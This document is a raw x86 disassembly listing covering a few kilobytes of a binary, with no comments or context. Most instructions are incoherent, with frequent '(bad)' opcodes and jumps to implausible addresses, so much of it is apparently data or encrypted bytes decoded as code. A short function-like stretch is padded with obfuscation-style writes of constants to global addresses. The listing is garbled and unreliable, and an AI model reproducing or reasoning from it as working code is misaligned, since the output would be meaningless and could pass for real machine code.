  403fe5:	inc    edi
  403fe7:	inc    ebp
  403fe8:	enter  0x918b,0xfc
  403fec:	inc    ebp
  403fed:	(bad)  
  403fee:	mov    eax,DWORD PTR [eax+edi*8-0x38cd3961]
  403ff5:	mov    DWORD PTR [esi-0x4],ebx
  403ff8:	rol    DWORD PTR [ebp-0x37],0x8b
  403ffc:	add    al,0xf4
  403ffe:	push   ebp
  403fff:	into   
  404000:	in     al,dx
  404001:	mov    BYTE PTR [ebp-0x3f],0x8b
  404005:	dec    ebp
  404006:	or     BYTE PTR [ebx],bh
  404008:	xor    BYTE PTR [esi+0x1],0x8b
  40400c:	add    ah,ah
  40400e:	add    dh,al
  404010:	in     al,dx
  404011:	(bad)  
  404012:	push   ebx
  404013:	inc    ebp
  404014:	mov    eax,edi
  404016:	adc    al,ch
  404018:	push   ss
  404019:	xchg   BYTE PTR [edi+0x7db08f8],bh
  40401f:	popa   
  404020:	iret   
  404021:	dec    ebp
  404022:	lahf   
  404023:	mov    esi,DWORD PTR [edx]
  404025:	clc    
  404026:	add    ecx,esi
  404028:	cmp    ecx,edi
  40402a:	jne    0x404014
  40402c:	add    DWORD PTR [ebp-0x6f],0x4f08648b
  404033:	or     BYTE PTR [ebx+0x48ae94d],bl
  404039:	or     eax,DWORD PTR [eax]
  40403b:	push   ebp
  40403c:	dec    ebp
  40403d:	jnp    0xd00a4d0c
  404043:	dec    ebp
  404044:	xlat   BYTE PTR ds:[ebx]
  404045:	mov    ecx,ebx
  404047:	call   0x340a961f
  40404c:	lsl    ecx,WORD PTR ds:0x7f8b2d23
  404053:	(bad)  
  404054:	cld    
  404055:	sti    
  404056:	lahf   
  404057:	(bad)  
  404058:	mov    ebp,0x8b330055
  40405d:	mov    DWORD PTR [eax],ecx
  40405f:	clc    
  404060:	iret   
  404061:	dec    ebp
  404062:	retf   
  404063:	xor    eax,ecx
  404065:	lea    eax,[eax+ecx*1+0x7204]
  40406c:	dec    ebp
  40406d:	inc    ebp
  40406e:	mov    DWORD PTR [ebx-0x39b20b24],ecx
  404074:	mov    esp,DWORD PTR [ecx+0x14]
  404077:	int    0x6
  404079:	sub    eax,DWORD PTR [ebp+0x3]
  40407c:	(bad)  
  40407d:	lock or BYTE PTR [ebp-0x7b],cl
  404081:	mov    edi,eax
  404083:	in     al,dx
  404084:	cmp    ecx,DWORD PTR [ebp-0x64]
  404087:	xor    ecx,DWORD PTR [ecx+0x453bf003]
  40408d:	jne    0x404018
  40408f:	mov    ebx,DWORD PTR [eax]
  404091:	in     al,0x45
  404093:	dec    ebp
  404094:	mov    esi,DWORD PTR [ebx]
  404096:	nop
  404097:	add    eax,DWORD PTR [eax]
  404099:	pop    edi
  40409a:	mov    esi,DWORD PTR [ebx]
  40409c:	mov    DWORD PTR [ebx-0x2c],ebx
  40409f:	ret    0x4d
  4040a2:	mov    ecx,DWORD PTR [ebx+0x18008b90]
  4040a8:	mov    ecx,DWORD PTR [ebp+0x3]
  4040ab:	mov    edi,DWORD PTR [eax+edx*4]
  4040ae:	dec    ebp
  4040af:	add    BYTE PTR [ebx-0x387cf775],cl
  4040b5:	jo     0x40407a
  4040b7:	push   esi
  4040b8:	inc    ebp
  4040b9:	jne    0x404046
  4040bb:	mov    ecx,DWORD PTR [eax]
  4040bd:	push   edi
  4040be:	(bad)  
  4040bf:	pop    ecx
  4040c0:	ret    
  4040c1:	push   ecx
  4040c2:	inc    ebp
  4040c3:	xor    ecx,DWORD PTR [ebx+0x40720cbb]
  4040c9:	add    BYTE PTR [ebx+0x45d10ccb],al
  4040cf:	jnp    0x406d4d02
  4040d5:	jg     0x404062
  4040d7:	jmp    0x54:0xde85700c
  4040de:	inc    ebp
  4040df:	mov    esi,DWORD PTR [eax+ecx*1-0x75]
  4040e3:	push   ebp
  4040e4:	cmp    BYTE PTR [ebx],dh
  4040e6:	dec    ebp
  4040e7:	xor    ecx,DWORD PTR [ebx-0x8fcabfd]
  4040ed:	cmp    esp,DWORD PTR [ebx]
  4040ef:	jne    0x40407c
  4040f1:	or     DWORD PTR [ecx+edx*4],0xee036440
  4040f8:	jmp    0x40410f
  4040fa:	mov    ebp,ecx
  4040fc:	push   esp
  4040fd:	add    al,0x45
  4040ff:	add    BYTE PTR [ebx-0x38ccf7b3],cl
  404105:	add    eax,ebx
  404107:	cmp    eax,DWORD PTR [ebp+0xf]
  40410a:	mov    esp,DWORD PTR [eax+ecx*1-0x3c743900]
  404111:	sbb    BYTE PTR [ebp+0x45],al
  404114:	mov    ecx,DWORD PTR [ecx+0x4d4d1808]
  40411a:	xor    ecx,DWORD PTR [ebx-0x277676fd]
  404120:	mov    DWORD PTR [ebp+0x14],eax
  404123:	cmp    BYTE PTR [ebp-0x64],al
  404126:	cmp    bh,BYTE PTR [edx-0x7387a64]
  40412c:	adc    al,0x55
  40412e:	test   DWORD PTR [ebx+0x454518f8],ecx
  404134:	cmp    al,0x8b
  404136:	pushf  
  404137:	sbb    BYTE PTR [ebx+0x4d01f080],cl
  40413d:	add    BYTE PTR [ebx],dh
  40413f:	add    BYTE PTR [ebx],al
  404141:	dec    ebp
  404142:	jnp    0x898d5a09
  404148:	mov    eax,DWORD PTR [ecx]
  40414a:	rol    BYTE PTR [eax],1
  40414c:	iret   
  40414d:	or     DWORD PTR [eax+ecx*2+0xc32899f],ecx
  404154:	cmp    eax,DWORD PTR [ebp+0xf]
  404157:	xor    ebp,DWORD PTR [ebx+eax*1-0xb747700]
  40415e:	or     BYTE PTR [ebp-0x39],al
  404161:	xor    eax,ebx
  404163:	add    eax,DWORD PTR [ebp-0x77]
  404166:	mov    edx,DWORD PTR [eax+ebx*1]
  404169:	inc    ebp
  40416a:	inc    ebp
  40416b:	mov    ecx,DWORD PTR [ecx+0x75e8f450]
  404171:	mov    DWORD PTR [ebx+0x4d45dcd0],ecx
  404177:	mov    ebp,eax
  404179:	cmp    cl,dh
  40417b:	dec    ebp
  40417c:	dec    DWORD PTR [eax+0x45]
  40417f:	inc    ecx
  404180:	(bad)  
  404181:	mov    esp,eax
  404183:	or     al,0x85
  404185:	sbb    al,bh
  404187:	inc    eax
  404188:	inc    ebp
  404189:	mov    esi,DWORD PTR [ebx]
  40418b:	or     al,0x3
  40418d:	dec    ecx
  40418e:	push   eax
  40418f:	dec    eax
  404190:	inc    ebp
  404191:	rcl    BYTE PTR [eax-0x38],1
  404194:	push   eax
  404195:	inc    ebp
  404196:	dec    DWORD PTR [ebx-0x3e07c775]
  40419c:	rol    BYTE PTR [ebx],0x4e
  40419f:	inc    eax
  4041a0:	inc    ebp
  4041a1:	mov    DWORD PTR [ebx],esi
  4041a3:	sbb    BYTE PTR [ebx],al
  4041a5:	inc    ebp
  4041a6:	push   eax
  4041a7:	xor    esi,DWORD PTR [ebp+0x3]
  4041aa:	lea    ecx,[ecx+0x45e814b8]
  4041b0:	cmc    
  4041b1:	xor    edi,edi
  4041b3:	add    eax,DWORD PTR [ebp-0x77]
  4041b6:	mov    DWORD PTR [eax+eiz*8],edx
  4041b9:	inc    ebp
  4041ba:	inc    ebp
  4041bb:	mov    ecx,DWORD PTR [ebx-0x3e38232c]
  4041c1:	ret    
  4041c2:	inc    ebp
  4041c3:	add    DWORD PTR [ebx+0x4dc7f855],ecx
  4041c9:	adc    al,0x8b
  4041cb:	test   DWORD PTR [eax],edx
  4041cd:	clc    
  4041ce:	inc    ecx
  4041cf:	inc    ebp
  4041d0:	mov    edi,DWORD PTR ds:0xc7c89ce0
  4041d6:	push   ss
  4041d7:	adc    al,0x45
  4041d9:	test   DWORD PTR [ebx+0x4d450cf8],ecx
  4041df:	mov    eax,DWORD PTR [ebx]
  4041e1:	sbb    BYTE PTR [eax],cl
  4041e3:	(bad)  
  4041e4:	dec    ebp
  4041e5:	ret    
  4041e6:	sub    ebp,DWORD PTR [edi+0x8028be9]
  4041ec:	add    BYTE PTR [ebp+0xc],dl
  4041ef:	xor    esi,DWORD PTR [ebp-0x73]
  4041f2:	lea    edx,[ecx]
  4041f4:	lods   al,BYTE PTR ds:[esi]
  4041f5:	jb     0x4041df
  4041f7:	add    ch,dh
  4041f9:	sar    edi,0x83
  4041fc:	cmp    BYTE PTR [ebx],al
  4041fe:	pushf  
  4041ff:	add    BYTE PTR [ecx+0x4533cc45],cl
  404205:	add    edi,DWORD PTR [ebx]
  404207:	mov    DWORD PTR [esp+edx*1+0x3c445c7],ebx
  40420e:	test   esp,ebx
  404210:	clc    
  404211:	inc    ebp
  404212:	inc    ebp
  404213:	(bad)  
  404214:	cmp    eax,0x8d759cf4
  404219:	mov    ecx,esp
  40421b:	or     al,0x4d
  40421d:	bound  ecx,QWORD PTR [ebp+0x4d89c8ff]
  404223:	clc    
  404224:	lea    eax,[ebp-0x3c]
  404227:	xor    BYTE PTR [ebp-0x64],cl
  40422a:	lea    ecx,[ebx-0x38b21f40]
  404230:	mov    eax,ebx
  404232:	or     BYTE PTR [ebp-0x17344731],cl
  404238:	dec    ebp
  404239:	imul   ecx
  40423b:	inc    DWORD PTR [ecx]
  40423d:	inc    ebp
  40423e:	add    BYTE PTR [ebp-0x74638bc6],al
  404244:	pavgb  mm7,mm6
  404247:	mov    DWORD PTR [eax],0xf0ff8bc3
  40424d:	clc    
  40424e:	iret   
  40424f:	inc    ebp
  404250:	lock push eax
  404252:	retf   
  404253:	fmul   QWORD PTR [ebp-0x1]
  404256:	mov    ecx,DWORD PTR [ebx+0x45f7f4e0]
  40425c:	test   BYTE PTR [ebx+0x4d32e09f],cl
  404262:	mov    DWORD PTR [ebx],ebp
  404264:	loopne 0x4041ef
  404266:	inc    ebp
  404267:	loopne 0x4041f4
  404269:	inc    ebp
  40426a:	loopne 0x4041f7
  40426c:	xbegin 0x4088335
  404272:	adc    ecx,DWORD PTR [eax*2+0x33b334d]
  404279:	jb     0x4042cb
  40427b:	mov    ecx,DWORD PTR [eax+edi*8]
  40427e:	inc    ebp
  40427f:	inc    eax
  404280:	push   eax
  404281:	mov    ebx,DWORD PTR [edi-0x8]
  404284:	inc    DWORD PTR [ecx-0x75]
  404287:	mov    ebp,esp
  404289:	loopne 0x40428b
  40428b:	rol    edi,0xee
  40428e:	test   BYTE PTR [eax],al
  404290:	dec    ebx
  404291:	push   0x32
  404293:	dec    DWORD PTR [ebx-0x30baf70c]
  404299:	push   eax
  40429a:	mov    dh,0x94
  40429c:	add    edi,edi
  40429e:	cmp    edi,DWORD PTR [eax-0x7877af1]
  4042a4:	add    BYTE PTR [ebp-0x75],al
  4042a7:	(bad)  
  4042a8:	call   0xc7c54375
  4042ad:	clc    
  4042ae:	test   BYTE PTR [ebp+0x4b],al
  4042b1:	cmp    dh,BYTE PTR [edx]
  4042b3:	pushf  
  4042b4:	mov    eax,edi
  4042b6:	or     al,al
  4042b8:	iret   
  4042b9:	test   DWORD PTR [esi+0x3b4d03f8],esi
  4042bf:	mov    DWORD PTR [edi],ecx
  4042c1:	in     al,dx
  4042c2:	pop    eax
  4042c3:	dec    ebp
  4042c4:	add    BYTE PTR [ecx+0x4df8e88b],cl
  4042ca:	add    BYTE PTR [ecx+0x4d84f8c7],cl
  4042d0:	dec    ebx
  4042d1:	mov    DWORD PTR [edx],esi
  4042d3:	in     al,0x8b
  4042d5:	dec    ebp
  4042d6:	or     BYTE PTR [ebx],dh
  4042d8:	iret   
  4042d9:	add    esi,DWORD PTR [esi+0x3be00389]
  4042df:	test   DWORD PTR [edi],0x3d3800
  4042e5:	test   DWORD PTR [ebx+0x84e4f8],ecx
  4042eb:	add    edi,eax
  4042ed:	add    BYTE PTR [ebp+ecx*2-0x74cdccb5],al
  4042f4:	mov    eax,DWORD PTR [ebx]
  4042f6:	or     BYTE PTR [ecx+0x45b614cf],cl
  4042fc:	add    esi,DWORD PTR [ebx]
  4042fe:	cmp    ecx,DWORD PTR [ebp+0x7218300f]
  404304:	add    BYTE PTR [eax],al
  404306:	mov    eax,DWORD PTR [ebp-0x18]
  404309:	mov    eax,DWORD PTR [eax]
  40430b:	lock (bad) 
  40430d:	dec    ebp
  40430e:	test   BYTE PTR [ebx],dh
  404310:	dec    ebx
  404311:	add    esi,DWORD PTR [edx]
  404313:	cmp    ecx,DWORD PTR [ebx+0x98bec75]
  404319:	or     bh,cl
  40431b:	(bad)  
  40431c:	mov    ebx,es
  40431e:	dec    ebx
  40431f:	push   0x32
  404321:	lea    esi,[edx]
  404323:	lods   al,BYTE PTR ds:[esi]
  404324:	mov    ebp,eax
  404326:	clc    
  404327:	cli    
  404328:	or     edi,edi
  40432a:	iret   
  40432b:	inc    ebp
  40432c:	mov    WORD PTR [ebx-0x75cdccb5],cs
  404332:	or     al,BYTE PTR ds:0xec728b
  404338:	or     DWORD PTR [ebp-0x31],ecx
  40433b:	xor    ecx,DWORD PTR [edi+ecx*1-0x34cd3fb1]
  404342:	cmp    al,cl
  404344:	je     0x40451e
  40434a:	mov    eax,DWORD PTR [ebp-0x8]
  40434d:	mov    eax,DWORD PTR [eax]
  40434f:	xor    eax,edi
  404351:	mov    al,BYTE PTR [ebp+eax*1+0x32724b]
  404358:	mov    ecx,DWORD PTR [ebp-0x18]
  40435b:	xor    ecx,DWORD PTR [ecx]
  40435d:	bswap  edi
  40435f:	ror    BYTE PTR [ebx+ecx*8-0x7bcd3eb5],0x32
  404367:	add    DWORD PTR [ebx+0x945e400],ecx
  40436d:	mov    ecx,edi
  40436f:	xor    ecx,DWORD PTR [edx+ecx*4+0x7232054b]
  404376:	or     al,BYTE PTR [eax]
  404378:	mov    ecx,DWORD PTR [ebp-0x18]
  40437b:	xor    ecx,DWORD PTR [ecx]
  40437d:	bswap  edi
  40437f:	ror    BYTE PTR [ebx+ecx*8-0x7bcd3eb1],0x3a
  404387:	add    DWORD PTR [edi],ecx
  404389:	add    BYTE PTR [eax-0x7474ffbb],dl
  40438f:	xor    esp,esp
  404391:	mov    al,BYTE PTR [eax]
  404393:	add    eax,0x8472c7
  404398:	dec    ebx
  404399:	dec    ebp
  40439a:	xor    dh,BYTE PTR [ebx]
  40439c:	mov    ecx,DWORD PTR [edi]
  40439e:	clc    
  40439f:	ror    BYTE PTR [ecx],0xcb
  4043a2:	iret   
  4043a3:	ror    DWORD PTR [esp+eax*4+0x32014b],0x32
  4043ab:	inc    ebp
  4043ac:	mov    ecx,DWORD PTR [ebx-0x75f6cc14]
  4043b2:	iret   
  4043b3:	add    eax,0x4b728c
  4043b8:	xor    cl,BYTE PTR [ebp+0xa]
  4043bb:	mov    ecx,DWORD PTR [ebx+0x98af833]
  4043c1:	or     eax,0x8c72cf
  4043c6:	dec    edi
  4043c7:	shl    DWORD PTR [edx],0x4d
  4043ca:	cmp    cl,BYTE PTR [ebx-0x7574cc8b]
  4043d0:	in     al,0xd
  4043d2:	add    BYTE PTR [edx-0x39],dh
  4043d5:	add    BYTE PTR [ecx+eax*8-0x74cdb2b5],al
  4043dc:	mov    esi,DWORD PTR [ebx]
  4043de:	in     al,dx
  4043df:	mov    cl,BYTE PTR [ecx]
  4043e1:	or     eax,0x8c72cf
  4043e6:	dec    ebx
  4043e7:	enter  0x8532,0x32
  4043eb:	add    BYTE PTR [ebx+0x945e800],cl
  4043f1:	mov    ecx,edi
  4043f3:	xor    ecx,DWORD PTR [edx+ecx*4+0x7232054b]
  4043fa:	or     al,BYTE PTR [eax]
  4043fc:	mov    ecx,DWORD PTR [ebp-0x1c]
  4043ff:	mov    ecx,DWORD PTR [ecx]
  404401:	xor    ecx,edi
  404403:	mov    cl,BYTE PTR [ebp+ecx*1+0x32724f]
  40440a:	cmp    al,cl
  40440c:	jne    0x40445b
  40440e:	lea    ecx,[ebx-0x7517cc54]
  404414:	cli    
  404415:	or     eax,0x4d72ff
  40441a:	cmp    eax,ecx
  40441c:	je     0x40446b
  40441e:	mov    ecx,DWORD PTR [ebx-0x7538ccf8]
  404424:	ret    
  404425:	or     eax,0x8b7245
  40442a:	lock enter 0x85c7,0x84
  40442f:	add    BYTE PTR [edi+0x33453200],bl
  404435:	mov    ecx,DWORD PTR [ebx+0x558a0833]
  40443b:	add    eax,0x37233
  404440:	cmp    ecx,DWORD PTR [ebp+0xf]
  404443:	mov    esi,edi
  404445:	xor    edi,edi
  404447:	mov    cl,BYTE PTR [ebx+0x4d72080d]
  40444d:	add    BYTE PTR [ebx],dh
  40444f:	rol    DWORD PTR [ebx],0x4d
  404452:	cmp    ecx,DWORD PTR [ebx-0x7574cc8b]
  404458:	lock or eax,0x33724d
  40445e:	(bad)  
  40445f:	ror    DWORD PTR [eax],0x4d
  404462:	jb     0x4043ef
  404464:	add    BYTE PTR [ebx],dh
  404466:	ja     0x4043f2
  404468:	sbb    BYTE PTR ds:0x8d7275,cl
  40446e:	xchg   esp,eax
  40446f:	enter  0x50e8,0xf3
  404473:	inc    ebp
  404474:	dec    DWORD PTR [ebx-0x7574ccbb]
  40447a:	loopne 0x404481
  40447c:	(bad)  
  40447d:	jb     0x404442
  40447f:	add    cl,al
  404481:	dec    ebp
  404482:	adc    ecx,DWORD PTR [ebx-0x75ccccbb]
  404488:	add    ecx,DWORD PTR ds:0x187250
  40448e:	inc    ebp
  40448f:	rcl    DWORD PTR [eax+0x4d],0x4f
  404493:	mov    edi,edi
  404495:	xor    ecx,DWORD PTR [ebx-0x3ff20b76]
  40449b:	jb     0x404426
  40449d:	add    BYTE PTR [ecx+eax*8],dl
  4044a0:	jne    0x4044ef
  4044a2:	dec    DWORD PTR [ebx-0x75baccec]
  4044a8:	add    ecx,DWORD PTR ds:0xe872d8
  4044ae:	repnz enter 0x10ff,0x45
  4044b3:	inc    ebp
  4044b4:	mov    edx,DWORD PTR [eax-0x20]
  4044b7:	mov    ds:0x8bc3ffc7,eax
  4044bc:	shl    DWORD PTR [ecx+edx*1+0x750a00c1],0x45
  4044c4:	mov    esi,DWORD PTR [ebx]
  4044c6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4044c7:	add    eax,DWORD PTR [ebp-0x77]
  4044ca:	push   eax
  4044cb:	adc    al,0x15
  4044cd:	inc    ebp
  4044ce:	push   DWORD PTR [ebx]
  4044d0:	mov    ecx,DWORD PTR [ebp+0x724d30d4]
  4044d6:	add    DWORD PTR [eax],eax
  4044d8:	mov    eax,edi
  4044da:	test   al,0x4d
  4044dc:	inc    ebp
  4044dd:	mov    ecx,DWORD PTR [ecx+0x45cf1814]
  4044e3:	retf   
  4044e4:	mov    edx,ecx
  4044e6:	sbb    BYTE PTR [edi+eax*8-0x50003c03],al
  4044ed:	inc    ebp
  4044ee:	mov    ecx,DWORD PTR [ebx-0x38aaebf8]
  4044f4:	xor    eax,ebx
  4044f6:	(bad)  
  4044f7:	enter  0x1111,0x72
  4044fb:	inc    ebp
  4044fc:	add    BYTE PTR [ebx-0x387de73f],cl
  404502:	cld    
  404503:	test   bh,bh
  404505:	lahf   
  404506:	jne    0x40453a
  404508:	mov    ebp,ebx
  40450a:	fsubr  DWORD PTR [edx+0x6]
  40450d:	dec    DWORD PTR [edx]
  40450f:	hlt    
  404510:	xor    eax,0x7f502d45
  404515:	sbb    ch,ah
  404517:	call   DWORD PTR [edx-0x75]
  40451a:	pop    esi
  40451b:	or     cl,cl
  40451d:	dec    ebp
  40451e:	adc    al,0x33
  404520:	push   ebp
  404521:	add    ebp,esp
  404523:	cmp    esp,esp
  404525:	je     0x4044aa
  404527:	mov    esp,DWORD PTR [eax]
  404529:	or     BYTE PTR [eax],bh
  40452b:	(bad)  
  40452c:	pushf  
  40452d:	ret    
  40452e:	mov    DWORD PTR [edx+0x24],ebp
  404531:	lea    ecx,[ebp+0x44e80394]
  404537:	clc    
  404538:	or     al,0xff
  40453a:	push   esp
  40453b:	inc    ebp
  40453c:	or     BYTE PTR [ebx+0x450818be],al
  404542:	pop    es
  404543:	call   esi
  404545:	test   al,0xbf
  404547:	jne    0x4045bb
  404549:	mov    eax,DWORD PTR [eax]
  40454b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40454c:	xlat   BYTE PTR ds:[ebx]
  40454d:	inc    ebp
  40454e:	push   esp
  40454f:	push   eax
  404550:	or     al,0xde
  404552:	push   ebp
  404553:	dec    DWORD PTR [ecx-0x74f7db75]
  404559:	dec    ebp
  40455a:	adc    BYTE PTR [ebx],dh
  40455c:	rol    DWORD PTR [ebx],1
  40455e:	sbb    BYTE PTR [ebx],bh
  404560:	dec    esp
  404561:	je     0x404577
  404563:	push   0x54
  404565:	call   DWORD PTR [eax]
  404567:	test   al,0xce
  404569:	inc    ebp
  40456a:	iret   
  40456b:	add    ebp,DWORD PTR [edi+0x24e889d8]
  404571:	clc    
  404572:	jmp    0x854776
  404577:	mov    edx,eax
  404579:	test   al,0x1f
  40457b:	or     BYTE PTR [ebp+eax*2+0x10],al
  40457f:	add    ecx,DWORD PTR [eax+ebx*1+0x14]
  404583:	inc    ebp
  404584:	(bad)  
  404585:	mov    eax,DWORD PTR [eax+esi*8+0x33324d9f]
  40458c:	mov    DWORD PTR [ebx],eax
  40458e:	and    al,0xf
  404590:	push   0xf84d85c1
  404595:	mov    edi,ebp
  404597:	rol    BYTE PTR [eax],1
  404599:	iret   
  40459a:	or     DWORD PTR [edx+edi*1+0x75329c9f],0x850f683b
  4045a5:	push   edi
  4045a6:	clc    
  4045a7:	(bad)  
  4045a8:	jmp    0x404535
  4045aa:	add    BYTE PTR [eax],dl
  4045ac:	mov    eax,0xf8898545
  4045b1:	jmp    0x404583
  4045b3:	add    DWORD PTR [ebp+0x640091],0x206544be
  4045bd:	pop    edi
  4045be:	inc    esp
  4045bf:	pop    ebx
  4045c0:	sbb    dl,al
  4045c2:	inc    ebp
  4045c3:	add    BYTE PTR [ecx-0x747cdb75],cl
  4045c9:	clc    
  4045ca:	and    al,0xec
  4045cc:	mov    DWORD PTR [ecx-0x7747adc],edi
  4045d2:	and    al,0x4c
  4045d4:	mov    DWORD PTR [eax],ecx
  4045d6:	and    al,0x41
  4045d8:	mov    ecx,DWORD PTR [ecx-0x7474dbdc]
  4045de:	and    al,0x24
  4045e0:	xor    edx,DWORD PTR [esi+0x3]
  4045e3:	pop    ecx
  4045e4:	mov    DWORD PTR [ecx-0x75],edx
  4045e7:	xor    esp,DWORD PTR [edi+edx*2]
  4045ea:	mov    ebx,DWORD PTR [edi+0x3003294]
  4045f0:	mov    ecx,DWORD PTR [ecx-0x74dbdb75]
  4045f6:	mov    ecx,DWORD PTR [esp+edx*4]
  4045f9:	push   esp
  4045fa:	add    BYTE PTR [eax],ah
  4045fc:	mov    edx,DWORD PTR [ebp+0x3]
  4045ff:	cmp    edi,DWORD PTR [esi*2+0x24188b4c]
  404606:	mov    DWORD PTR [ebx+0x33002401],ecx
  40460c:	dec    ecx
  40460d:	add    ebp,DWORD PTR [edx+0xf]
  404610:	push   0x4c30ca
  404615:	adc    BYTE PTR [eax+0x1f],dh
  404618:	push   0x0
  40461a:	(bad)  
  40461b:	cmp    ecx,DWORD PTR [ecx-0x7474db8b]
  404621:	and    al,0x24
  404623:	mov    esi,DWORD PTR [ebx]
  404625:	and    al,0x3
  404627:	xor    ecx,DWORD PTR [ecx-0x74f7db73]
  40462d:	jb     0x404653
  40462f:	add    bh,bh
  404631:	inc    esp
  404632:	and    al,0x14
  404634:	lea    edi,[edx]
  404636:	and    al,0x9c
  404638:	push   eax
  404639:	jmp    0x544682
  40463e:	(bad)  
  40463f:	cli    
  404640:	and    al,0x85
  404642:	(bad)  
  404643:	clc    
  404644:	and    al,0xa
  404646:	call   0xffdd3f88
  40464b:	jmp    0x544694
  404650:	dec    esp
  404651:	ds or  al,0x9c
  404654:	(bad)  
  404655:	cmp    eax,edi
  404657:	bswap  eax
  404659:	mov    bh,0x4b
  40465b:	add    BYTE PTR [ebx+ecx*4+0x20],al
  40465f:	and    al,0x4c
  404661:	mov    DWORD PTR [esp],ebx
  404664:	(bad)  
  404665:	mov    eax,edi
  404667:	or     BYTE PTR [edi-0x76e3dbbc],ch
  40466d:	inc    esp
  40466e:	jmp    0x404684
  404670:	add    DWORD PTR [ebp+edi*1+0x20],0x1075449c
  404678:	push   0xf8148544
  40467d:	inc    esp
  40467e:	sbb    BYTE PTR [edx+edi*8],dl
  404681:	dec    esp
  404682:	test   DWORD PTR [eax+edi*8],ebx
  404685:	mov    BYTE PTR [edi],0xc7
  404688:	aas    
  404689:	add    DWORD PTR [esp+eax*2-0x7f7ee715],ebx
  404690:	aas    
  404691:	add    DWORD PTR [eax+eax*1+0x44500875],ebx
  404698:	jne    0x4046b2
  40469a:	inc    DWORD PTR [eax+0xfa01f8]
  4046a0:	clc    
  4046a1:	add    bh,bh
  4046a3:	inc    ecx
  4046a4:	jne    0x404631
  4046a6:	call   0xffcc44cf
  4046ab:	fadd   DWORD PTR [eax+eax*1+0xc]
  4046af:	mov    eax,DWORD PTR [esp+edx*1+0xc]
  4046b3:	add    al,0x5e
  4046b5:	add    ch,ah
  4046b7:	add    dl,al
  4046b9:	inc    DWORD PTR [eax]
  4046bb:	push   eax
  4046bc:	and    al,0x0
  4046be:	rol    DWORD PTR ss:[ebp-0x63f3f8bc],1
  4046c5:	inc    esp
  4046c6:	adc    DWORD PTR [esp+ebx*4],0x9c768c6
  4046cd:	inc    esp
  4046ce:	adc    BYTE PTR [eax+ecx*1],ah
  4046d1:	inc    esp
  4046d2:	call   FWORD PTR [esp]
  4046d5:	je     0x4046fb
  4046d7:	sbb    BYTE PTR [ebx-0x74d7f3bc],cl
  4046dd:	lea    ecx,[ebx+0x3b503324]
  4046e3:	je     0x404670
  4046e5:	sub    al,0x8b
  4046e7:	je     0x40471c
  4046e9:	and    al,0xf
  4046eb:	mov    bl,0x1
  4046ed:	(bad)  
  4046ee:	clc    
  4046ef:	and    al,0xeb
  4046f1:	and    al,0x75
  4046f3:	add    eax,DWORD PTR [ebp-0x74db818c]
  4046f9:	and    al,0x5d
  4046fb:	add    eax,DWORD PTR [edx+edi*8+0x3c]
  4046ff:	cmp    al,0x85
  404701:	or     al,0x89
  404703:	pop    edi
  404704:	push   ebp
  404705:	mov    ebp,esp
  404707:	sub    esp,0x78
  40470a:	xor    eax,DWORD PTR ds:0x412370
  404710:	mov    eax,ds:0x40d5d0
  404715:	mov    DWORD PTR [ebp-0x10],eax
  404718:	mov    eax,ds:0x40d6dc
  40471d:	or     DWORD PTR ds:0x417e59,0x49bb
  404727:	mov    DWORD PTR [ebp-0x30],eax
  40472a:	mov    DWORD PTR [ebp-0xc],0xf89c8538
  404731:	mov    eax,ds:0x412368
  404736:	and    DWORD PTR ds:0x41abde,eax
  40473c:	mov    DWORD PTR [ebp-0x14],0xf89c853b
  404743:	mov    eax,DWORD PTR [ebp-0xc]
  404746:	xor    DWORD PTR ds:0x4245be,0x412378
  404750:	push   ebx
  404751:	push   esi
  404752:	and    DWORD PTR ds:0x417e55,0x7bf9
  40475c:	push   edi
  40475d:	mov    esi,0x7510859
  404762:	xor    eax,esi
  404764:	add    DWORD PTR ds:0x4245c6,0x4e22
  40476e:	mov    edi,0x32729f
  404773:	or     DWORD PTR ds:0x4245c6,0x5629
  40477d:	add    eax,edi
  40477f:	mov    DWORD PTR [ebp-0x20],eax
  404782:	movzx  eax,WORD PTR ds:0x412370
  404789:	and    DWORD PTR ds:0x415111,eax
  40478f:	mov    DWORD PTR [ebp-0x28],0xf89cb538
  404796:	dec    eax
  404797:	mov    DWORD PTR [ebp-0x34],0xf89f0538
  40479e:	mov    DWORD PTR [ebp-0x2c],0xf89c85f8
  4047a5:	add    DWORD PTR ds:0x41abd2,edx
  4047ab:	jmp    0x404924
  4047b0:	xlat   BYTE PTR ds:[ebx]
  4047b1:	mov    dl,0x2
  4047b3:	and    edi,DWORD PTR [ebx-0x5fa5289d]
  4047b9:	mov    al,ds:0x42df87ea
  4047be:	cdq    
  4047bf:	test   al,0x7e
  4047c1:	jle    0x404841
  4047c3:	jle    0x40479f
  4047c5:	jg     0x404845
  4047c7:	jle    0x404797
  4047c9:	(bad)  
  4047ca:	cmp    eax,0xcfdb31c5
  4047cf:	fld    st(2)
  4047d1:	ja     0x404847
  4047d3:	or     eax,DWORD PTR [eax]
  4047d5:	push   ss
  4047d6:	or     BYTE PTR [edi],cl
  4047d8:	cmp    ecx,DWORD PTR [edi]
  4047da:	enter  0x3710,0x18
  4047de:	pop    ds
  4047df:	mov    cl,0x50
  4047e1:	or     BYTE PTR [edi-0x4210f123],ah
  4047e7:	rol    esi,cl
  4047e9:	or     ecx,DWORD PTR [esi-0x551b41ea]
  4047ef:	dec    ecx
  4047f0:	add    eax,0x1fb6dead
  4047f5:	push   esi
  4047f6:	in     al,dx
  4047f7:	outs   dx,DWORD PTR ds:[esi]
  4047f8:	add    ebx,DWORD PTR [ecx]
  4047fa:	pushf  
  4047fb:	jo     0x4047c3
  4047fd:	dec    eax
  4047fe:	mov    ds:0x34d92d5b,al
  404803:	cmp    al,0xad
  404805:	xor    BYTE PTR [ebx+0x35],0xa3
  404809:	jbe    0x40483f
  40480b:	fisttp DWORD PTR [ecx+0x3198c6f1]
  404811:	jecxz  0x40484b
  404813:	and    ecx,0x4f
  404816:	(bad)  
  404817:	xchg   esi,eax
  404818:	dec    ecx
  404819:	inc    DWORD PTR [edi-0x2d5e8870]
  40481f:	mov    ebp,0x4526ed4d
  404824:	sub    edi,DWORD PTR [edx-0x4361911e]
  40482a:	jae    0x404845
  40482c:	retf   
  40482d:	call   0xd4ca:0x5ee3c429
  404834:	mov    al,0xf8
  404836:	loop   0x4047d2
  404838:	cmp    edi,ecx
  40483a:	fs push ebp
  40483c:	(bad)  
  40483d:	sub    ch,cl
  40483f:	or     dl,cl
  404841:	sbb    DWORD PTR [ecx-0x6a],ebx
  404844:	and    eax,0x70696f0b
  404849:	add    BYTE PTR [ecx],bh
